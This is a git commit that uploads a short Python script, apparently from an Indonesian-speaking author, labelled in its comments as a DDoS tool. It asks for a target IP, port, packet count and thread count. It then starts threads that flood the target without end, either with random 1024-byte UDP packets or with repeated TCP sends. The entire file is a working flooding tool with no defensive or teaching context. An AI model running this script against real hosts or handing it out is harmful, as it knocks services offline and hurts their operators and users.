88d812c2e06cbfe7bb54ce68476d2b646c413072
Hannn07 <98598355+Hannn07@users.noreply.github.com>
2022-02-19 22:59:51 +0700

    Add files via upload

---
+++ Hin.py.py
@@ -0,0 +1,50 @@
+#!/usr/bin/env python3
+#Kagak Usah Rename BY By Tai Anjing 
+#Ddos by Yooooo
+import random
+import socket
+import threading
+import os
+
+os.system("clear")
+print("Input IP And Port")
+ip = str(input(" Ip: "))
+port = int(input(" Port: "))
+choice = str(input(" Attack?(y/n): "))
+times = int(input(" Packets: "))
+threads = int(input(" Threads: "))
+def run():
+  data = random._urandom(1024)
+  i = random.choice(("[*]","[!]","[#]"))
+  while True:
+    try:
+      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+      addr = (str(ip),int(port))
+      for x in range(times):
+        s.sendto(data,addr)
+      print(i +" | Send!!!|")
+    except:
+      print("[!] | Send!!! |")
+
+def run2():
+  data = random._urandom(16)
+  i = random.choice(("[*]","[!]","[#]"))
+  while True:
+    try:
+      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+      s.connect((ip,port))
+      s.send(data)
+      for x in range(times):
+        s.send(data)
+      print(i +" Yoooooooo Di Sini!!!")
+    except:
+      s.close()
+      print("[*] Down")
+
+for y in range(threads):
+  if choice == 'y':
+    th = threading.Thread(target = run)
+    th.start()
+  else:
+    th = threading.Thread(target = run2)
+    th.start()
